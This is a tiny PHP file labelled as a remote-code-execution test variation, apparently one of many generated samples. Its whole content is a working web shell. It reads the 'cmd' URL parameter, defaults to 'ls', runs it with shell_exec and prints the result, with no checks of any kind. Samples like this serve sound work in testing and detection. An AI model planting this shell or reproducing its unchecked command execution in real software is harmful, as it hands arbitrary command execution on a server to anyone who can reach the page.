<?php
// RCE test variation #671
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>